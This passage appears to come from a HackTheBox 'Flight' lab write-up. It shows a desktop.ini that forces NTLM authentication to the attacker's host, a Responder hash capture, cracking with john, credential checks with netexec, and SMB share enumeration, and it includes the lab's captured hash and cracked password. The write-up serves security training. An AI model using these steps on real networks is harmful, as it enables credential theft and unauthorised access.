</span><span id="__span-52-5"><a id="__codelineno-52-5" name="__codelineno-52-5" href="#__codelineno-52-5"></a><span class="w">        </span><span class="m">5056511</span><span class="w"> </span>blocks<span class="w"> </span>of<span class="w"> </span>size<span class="w"> </span><span class="m">4096</span>.<span class="w"> </span><span class="m">1189577</span><span class="w"> </span>blocks<span class="w"> </span>available
</span></code></pre></div>
<p>it is empty</p>
<h2 id="leaking-another-users-ntlm-hash">Leaking another user’s NTLM hash</h2>
<p>but since we have <code>WRITE</code> permissions, we might have to upload sth there</p>
<p>Found this: https://hacktricks.boitatech.com.br/windows/ntlm/places-to-steal-ntlm-creds#desktop.ini</p>
<p>Create a file called <code>desktop.ini</code></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a><span class="nb">echo</span><span class="w"> </span><span class="o">[</span>.ShellClassInfo<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>desktop.ini
</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;IconResource=\\10.10.14.180\thebestshareever&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>desktop.ini
</span></code></pre></div>
<p>Navigate to the share and upload the file:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>smbclient<span class="w"> </span>//flight.htb/shared<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;s.moon%S@Ss!K@*t13&#39;</span>
</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a>smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>put<span class="w"> </span>desktop.ini
</span><span id="__span-54-3"><a id="__codelineno-54-3" name="__codelineno-54-3" href="#__codelineno-54-3"></a>putting<span class="w"> </span>file<span class="w"> </span>desktop.ini<span class="w"> </span>as<span class="w"> </span><span class="se">\d</span>esktop.ini<span class="w"> </span><span class="o">(</span><span class="m">2</span>.4<span class="w"> </span>kb/s<span class="o">)</span><span class="w"> </span><span class="o">(</span>average<span class="w"> </span><span class="m">2</span>.4<span class="w"> </span>kb/s<span class="o">)</span>
</span></code></pre></div>
<p>Now start the responder:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>sudo<span class="w"> </span>responder<span class="w"> </span>-I<span class="w"> </span>tun0<span class="w"> </span>-wP
</span></code></pre></div>
<p>then navigate to the share again:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>└──╼<span class="w"> </span><span class="o">[</span>★<span class="o">]</span>$<span class="w"> </span>smbclient<span class="w"> </span>//flight.htb/shared<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;s.moon%S@Ss!K@*t13&#39;</span>
</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a>Try<span class="w"> </span><span class="s2">&quot;help&quot;</span><span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>a<span class="w"> </span>list<span class="w"> </span>of<span class="w"> </span>possible<span class="w"> </span>commands.
</span><span id="__span-56-3"><a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a>smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>
</span></code></pre></div>
<p>aand we got the NTLM hash of another user, <code>c.bum</code> !</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Listening<span class="w"> </span><span class="k">for</span><span class="w"> </span>events...
</span><span id="__span-57-2"><a id="__codelineno-57-2" name="__codelineno-57-2" href="#__codelineno-57-2"></a>
</span><span id="__span-57-3"><a id="__codelineno-57-3" name="__codelineno-57-3" href="#__codelineno-57-3"></a><span class="o">[</span>SMB<span class="o">]</span><span class="w"> </span>NTLMv2-SSP<span class="w"> </span>Client<span class="w">   </span>:<span class="w"> </span><span class="m">10</span>.129.228.120
</span><span id="__span-57-4"><a id="__codelineno-57-4" name="__codelineno-57-4" href="#__codelineno-57-4"></a><span class="o">[</span>SMB<span class="o">]</span><span class="w"> </span>NTLMv2-SSP<span class="w"> </span>Username<span class="w"> </span>:<span class="w"> </span>flight.htb<span class="se">\c</span>.bum
</span><span id="__span-57-5"><a id="__codelineno-57-5" name="__codelineno-57-5" href="#__codelineno-57-5"></a><span class="o">[</span>SMB<span class="o">]</span><span class="w"> </span>NTLMv2-SSP<span class="w"> </span>Hash<span class="w">     </span>:<span class="w"> </span>c.bum::flight.htb:17d5b761f4a33f2f:5DB137F84725B322F1D060C8911A33C8:010100000000000080A156AD6613DC01DB53B3184F0649420000000002000800460057005300500001001E00570049004E002D0034005700540030004300450052004F0041005000430004003400570049004E002D0034005700540030004300450052004F004100500043002E0046005700530050002E004C004F00430041004C000300140046005700530050002E004C004F00430041004C000500140046005700530050002E004C004F00430041004C000700080080A156AD6613DC01060004000200000008003000300000000000000000000000003000005108C442C3741020BE0C1669030BA6011CB2E34E998B97B6DD2F82EF286BF89D0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100380030000000000000000000
</span></code></pre></div>
<p>Now similarly with what we did earlier, we have to crack it</p>
<h2 id="cracking-ntlm-hash_1">Cracking NTLM hash</h2>
<p>place the hash on a file</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;c.bum::flight.htb:17d5b761f4a33f2f:5DB137F84725B322F1D060C8911A33C8:010100000000000080A156AD6613DC01DB53B3184F0649420000000002000800460057005300500001001E00570049004E002D0034005700540030004300450052004F0041005000430004003400570049004E002D0034005700540030004300450052004F004100500043002E0046005700530050002E004C004F00430041004C000300140046005700530050002E004C004F00430041004C000500140046005700530050002E004C004F00430041004C000700080080A156AD6613DC01060004000200000008003000300000000000000000000000003000005108C442C3741020BE0C1669030BA6011CB2E34E998B97B6DD2F82EF286BF89D0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100380030000000000000000000&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>cbum_hash
</span></code></pre></div>
<p>then use john to crack it:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>john<span class="w"> </span>cbum_hash<span class="w"> </span>--wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
</span></code></pre></div>
<p>it was successful:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>Using<span class="w"> </span>default<span class="w"> </span>input<span class="w"> </span>encoding:<span class="w"> </span>UTF-8
</span><span id="__span-60-2"><a id="__codelineno-60-2" name="__codelineno-60-2" href="#__codelineno-60-2"></a>Loaded<span class="w"> </span><span class="m">1</span><span class="w"> </span>password<span class="w"> </span><span class="nb">hash</span><span class="w"> </span><span class="o">(</span>netntlmv2,<span class="w"> </span>NTLMv2<span class="w"> </span>C/R<span class="w"> </span><span class="o">[</span>MD4<span class="w"> </span>HMAC-MD5<span class="w"> </span><span class="m">32</span>/64<span class="o">])</span>
</span><span id="__span-60-3"><a id="__codelineno-60-3" name="__codelineno-60-3" href="#__codelineno-60-3"></a>Will<span class="w"> </span>run<span class="w"> </span><span class="m">4</span><span class="w"> </span>OpenMP<span class="w"> </span>threads
</span><span id="__span-60-4"><a id="__codelineno-60-4" name="__codelineno-60-4" href="#__codelineno-60-4"></a>Press<span class="w"> </span><span class="s1">&#39;q&#39;</span><span class="w"> </span>or<span class="w"> </span>Ctrl-C<span class="w"> </span>to<span class="w"> </span>abort,<span class="w"> </span>almost<span class="w"> </span>any<span class="w"> </span>other<span class="w"> </span>key<span class="w"> </span><span class="k">for</span><span class="w"> </span>status
</span><span id="__span-60-5"><a id="__codelineno-60-5" name="__codelineno-60-5" href="#__codelineno-60-5"></a>Tikkycoll_431012284<span class="w"> </span><span class="o">(</span>c.bum<span class="o">)</span><span class="w">     </span>
</span><span id="__span-60-6"><a id="__codelineno-60-6" name="__codelineno-60-6" href="#__codelineno-60-6"></a>1g<span class="w"> </span><span class="m">0</span>:00:00:04<span class="w"> </span>DONE<span class="w"> </span><span class="o">(</span><span class="m">2025</span>-08-22<span class="w"> </span><span class="m">13</span>:18<span class="o">)</span><span class="w"> </span><span class="m">0</span>.2127g/s<span class="w"> </span>2241Kp/s<span class="w"> </span>2241Kc/s<span class="w"> </span>2241KC/s<span class="w"> </span>TinyMutt69..Tiffani29
</span><span id="__span-60-7"><a id="__codelineno-60-7" name="__codelineno-60-7" href="#__codelineno-60-7"></a>Use<span class="w"> </span>the<span class="w"> </span><span class="s2">&quot;--show --format=netntlmv2&quot;</span><span class="w"> </span>options<span class="w"> </span>to<span class="w"> </span>display<span class="w"> </span>all<span class="w"> </span>of<span class="w"> </span>the<span class="w"> </span>cracked<span class="w"> </span>passwords<span class="w"> </span>reliably
</span><span id="__span-60-8"><a id="__codelineno-60-8" name="__codelineno-60-8" href="#__codelineno-60-8"></a>Session<span class="w"> </span>completed.
</span></code></pre></div>
<p>creds obtained:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>c.bum
</span><span id="__span-61-2"><a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a>Tikkycoll_431012284
</span></code></pre></div>
<h2 id="checking-where-we-can-login-with-cbum-creds">Checking where we can login with c.bum creds</h2>
<p>Since we now have valid creds, lets use my script to bulk check the services that we can connect to via win-rm: <a href="https://github.com/ch3ckkm8/auto_netexec">ch3ckkm8/auto_netexec: Automating netexec to bulk check all available services, given the target and the creds to check</a></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>./auto_netexec_bulk_creds_checker.sh<span class="w"> </span>flight.htb<span class="w"> </span><span class="s1">&#39;c.bum&#39;</span><span class="w"> </span><span class="s1">&#39;Tikkycoll_431012284&#39;</span>
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>winrm<span class="w"> </span>port<span class="w"> </span><span class="m">5985</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>flight.htb...
</span><span id="__span-63-2"><a id="__codelineno-63-2" name="__codelineno-63-2" href="#__codelineno-63-2"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">5985</span><span class="w"> </span>open<span class="w"> </span>—<span class="w"> </span>checking<span class="w"> </span>winrm<span class="w"> </span>with<span class="w"> </span>netexec
</span><span id="__span-63-3"><a id="__codelineno-63-3" name="__codelineno-63-3" href="#__codelineno-63-3"></a>WINRM<span class="w">       </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">5985</span><span class="w">   </span>G0<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span><span class="o">(</span>name:G0<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:flight.htb<span class="o">)</span>
</span><span id="__span-63-4"><a id="__codelineno-63-4" name="__codelineno-63-4" href="#__codelineno-63-4"></a>WINRM<span class="w">       </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">5985</span><span class="w">   </span>G0<span class="w">               </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>flight.htb<span class="se">\c</span>.bum:Tikkycoll_431012284
</span><span id="__span-63-5"><a id="__codelineno-63-5" name="__codelineno-63-5" href="#__codelineno-63-5"></a>
</span><span id="__span-63-6"><a id="__codelineno-63-6" name="__codelineno-63-6" href="#__codelineno-63-6"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>smb<span class="w"> </span>port<span class="w"> </span><span class="m">445</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>flight.htb...
</span><span id="__span-63-7"><a id="__codelineno-63-7" name="__codelineno-63-7" href="#__codelineno-63-7"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">445</span><span class="w"> </span>open<span class="w"> </span>—<span class="w"> </span>checking<span class="w"> </span>smb<span class="w"> </span>with<span class="w"> </span>netexec
</span><span id="__span-63-8"><a id="__codelineno-63-8" name="__codelineno-63-8" href="#__codelineno-63-8"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:G0<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:flight.htb<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
</span><span id="__span-63-9"><a id="__codelineno-63-9" name="__codelineno-63-9" href="#__codelineno-63-9"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>flight.htb<span class="se">\c</span>.bum:Tikkycoll_431012284<span class="w"> </span>
</span><span id="__span-63-10"><a id="__codelineno-63-10" name="__codelineno-63-10" href="#__codelineno-63-10"></a>
</span><span id="__span-63-11"><a id="__codelineno-63-11" name="__codelineno-63-11" href="#__codelineno-63-11"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>ldap<span class="w"> </span>port<span class="w"> </span><span class="m">389</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>flight.htb...
</span><span id="__span-63-12"><a id="__codelineno-63-12" name="__codelineno-63-12" href="#__codelineno-63-12"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">389</span><span class="w"> </span>open<span class="w"> </span>—<span class="w"> </span>checking<span class="w"> </span>ldap<span class="w"> </span>with<span class="w"> </span>netexec
</span><span id="__span-63-13"><a id="__codelineno-63-13" name="__codelineno-63-13" href="#__codelineno-63-13"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:G0<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:flight.htb<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
</span><span id="__span-63-14"><a id="__codelineno-63-14" name="__codelineno-63-14" href="#__codelineno-63-14"></a>LDAP<span class="w">        </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">389</span><span class="w">    </span>G0<span class="w">               </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>flight.htb<span class="se">\c</span>.bum:Tikkycoll_431012284<span class="w"> </span>
</span><span id="__span-63-15"><a id="__codelineno-63-15" name="__codelineno-63-15" href="#__codelineno-63-15"></a>
</span><span id="__span-63-16"><a id="__codelineno-63-16" name="__codelineno-63-16" href="#__codelineno-63-16"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>rdp<span class="w"> </span>port<span class="w"> </span><span class="m">3389</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>flight.htb...
</span><span id="__span-63-17"><a id="__codelineno-63-17" name="__codelineno-63-17" href="#__codelineno-63-17"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>rdp<span class="w"> </span>—<span class="w"> </span>port<span class="w"> </span><span class="m">3389</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-63-18"><a id="__codelineno-63-18" name="__codelineno-63-18" href="#__codelineno-63-18"></a>
</span><span id="__span-63-19"><a id="__codelineno-63-19" name="__codelineno-63-19" href="#__codelineno-63-19"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>wmi<span class="w"> </span>port<span class="w"> </span><span class="m">135</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>flight.htb...
</span><span id="__span-63-20"><a id="__codelineno-63-20" name="__codelineno-63-20" href="#__codelineno-63-20"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Port<span class="w"> </span><span class="m">135</span><span class="w"> </span>open<span class="w"> </span>—<span class="w"> </span>checking<span class="w"> </span>wmi<span class="w"> </span>with<span class="w"> </span>netexec
</span><span id="__span-63-21"><a id="__codelineno-63-21" name="__codelineno-63-21" href="#__codelineno-63-21"></a>RPC<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">135</span><span class="w">    </span>G0<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span><span class="o">(</span>name:G0<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:flight.htb<span class="o">)</span>
</span><span id="__span-63-22"><a id="__codelineno-63-22" name="__codelineno-63-22" href="#__codelineno-63-22"></a>RPC<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">135</span><span class="w">    </span>G0<span class="w">               </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>flight.htb<span class="se">\c</span>.bum:Tikkycoll_431012284<span class="w"> </span>
</span><span id="__span-63-23"><a id="__codelineno-63-23" name="__codelineno-63-23" href="#__codelineno-63-23"></a>
</span><span id="__span-63-24"><a id="__codelineno-63-24" name="__codelineno-63-24" href="#__codelineno-63-24"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>nfs<span class="w"> </span>port<span class="w"> </span><span class="m">2049</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>flight.htb...
</span><span id="__span-63-25"><a id="__codelineno-63-25" name="__codelineno-63-25" href="#__codelineno-63-25"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>nfs<span class="w"> </span>—<span class="w"> </span>port<span class="w"> </span><span class="m">2049</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-63-26"><a id="__codelineno-63-26" name="__codelineno-63-26" href="#__codelineno-63-26"></a>
</span><span id="__span-63-27"><a id="__codelineno-63-27" name="__codelineno-63-27" href="#__codelineno-63-27"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>ssh<span class="w"> </span>port<span class="w"> </span><span class="m">22</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>flight.htb...
</span><span id="__span-63-28"><a id="__codelineno-63-28" name="__codelineno-63-28" href="#__codelineno-63-28"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>ssh<span class="w"> </span>—<span class="w"> </span>port<span class="w"> </span><span class="m">22</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-63-29"><a id="__codelineno-63-29" name="__codelineno-63-29" href="#__codelineno-63-29"></a>
</span><span id="__span-63-30"><a id="__codelineno-63-30" name="__codelineno-63-30" href="#__codelineno-63-30"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>vnc<span class="w"> </span>port<span class="w"> </span><span class="m">5900</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>flight.htb...
</span><span id="__span-63-31"><a id="__codelineno-63-31" name="__codelineno-63-31" href="#__codelineno-63-31"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>vnc<span class="w"> </span>—<span class="w"> </span>port<span class="w"> </span><span class="m">5900</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-63-32"><a id="__codelineno-63-32" name="__codelineno-63-32" href="#__codelineno-63-32"></a>
</span><span id="__span-63-33"><a id="__codelineno-63-33" name="__codelineno-63-33" href="#__codelineno-63-33"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>ftp<span class="w"> </span>port<span class="w"> </span><span class="m">21</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>flight.htb...
</span><span id="__span-63-34"><a id="__codelineno-63-34" name="__codelineno-63-34" href="#__codelineno-63-34"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>ftp<span class="w"> </span>—<span class="w"> </span>port<span class="w"> </span><span class="m">21</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-63-35"><a id="__codelineno-63-35" name="__codelineno-63-35" href="#__codelineno-63-35"></a>
</span><span id="__span-63-36"><a id="__codelineno-63-36" name="__codelineno-63-36" href="#__codelineno-63-36"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>mssql<span class="w"> </span>port<span class="w"> </span><span class="m">1433</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span>flight.htb...
</span><span id="__span-63-37"><a id="__codelineno-63-37" name="__codelineno-63-37" href="#__codelineno-63-37"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>mssql<span class="w"> </span>—<span class="w"> </span>port<span class="w"> </span><span class="m">1433</span><span class="w"> </span>is<span class="w"> </span>closed
</span></code></pre></div>
<p>It seems we can login to:  <code>SMB</code> <code>LDAP</code> <code>RPC</code> services, lets enumerate further…</p>
<h2 id="smb-enumeration-as-cbum">SMB enumeration as C.Bum</h2>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span>flight.htb<span class="w">  </span>-u<span class="w"> </span><span class="s1">&#39;c.bum&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Tikkycoll_431012284&#39;</span><span class="w"> </span>--shares
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:G0<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:flight.htb<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
</span><span id="__span-65-2"><a id="__codelineno-65-2" name="__codelineno-65-2" href="#__codelineno-65-2"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>flight.htb<span class="se">\c</span>.bum:Tikkycoll_431012284<span class="w"> </span>
</span><span id="__span-65-3"><a id="__codelineno-65-3" name="__codelineno-65-3" href="#__codelineno-65-3"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Enumerated<span class="w"> </span>shares
</span><span id="__span-65-4"><a id="__codelineno-65-4" name="__codelineno-65-4" href="#__codelineno-65-4"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>Share<span class="w">           </span>Permissions<span class="w">     </span>Remark
</span><span id="__span-65-5"><a id="__codelineno-65-5" name="__codelineno-65-5" href="#__codelineno-65-5"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>-----<span class="w">           </span>-----------<span class="w">     </span>------
</span><span id="__span-65-6"><a id="__codelineno-65-6" name="__codelineno-65-6" href="#__codelineno-65-6"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>ADMIN$<span class="w">                          </span>Remote<span class="w"> </span>Admin
</span><span id="__span-65-7"><a id="__codelineno-65-7" name="__codelineno-65-7" href="#__codelineno-65-7"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>C$<span class="w">                              </span>Default<span class="w"> </span>share
</span><span id="__span-65-8"><a id="__codelineno-65-8" name="__codelineno-65-8" href="#__codelineno-65-8"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>IPC$<span class="w">            </span>READ<span class="w">            </span>Remote<span class="w"> </span>IPC
</span><span id="__span-65-9"><a id="__codelineno-65-9" name="__codelineno-65-9" href="#__codelineno-65-9"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>NETLOGON<span class="w">        </span>READ<span class="w">            </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="w"> </span>
</span><span id="__span-65-10"><a id="__codelineno-65-10" name="__codelineno-65-10" href="#__codelineno-65-10"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>Shared<span class="w">          </span>READ,WRITE<span class="w">      </span>
</span><span id="__span-65-11"><a id="__codelineno-65-11" name="__codelineno-65-11" href="#__codelineno-65-11"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>SYSVOL<span class="w">          </span>READ<span class="w">            </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="w"> </span>
</span><span id="__span-65-12"><a id="__codelineno-65-12" name="__codelineno-65-12" href="#__codelineno-65-12"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>Users<span class="w">           </span>READ<span class="w">            </span>
</span><span id="__span-65-13"><a id="__codelineno-65-13" name="__codelineno-65-13" href="#__codelineno-65-13"></a>SMB<span class="w">         </span><span class="m">10</span>.129.228.120<span class="w">  </span><span class="m">445</span><span class="w">    </span>G0<span class="w">               </span>Web<span class="w">             </span>READ,WRITE
</span></code></pre></div>
<p>This user has <code>WRITE</code> access to the <code>Web</code> share, sth all the previously found user did not have, lets dive in</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>smbclient<span class="w"> </span>//flight.htb/Web<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;c.bum%Tikkycoll_431012284&#39;</span>
</span></code></pre></div>
<p>inside there are 2 folders, each one containing the source code for each page we found on the web app earlier</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a>smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>ls
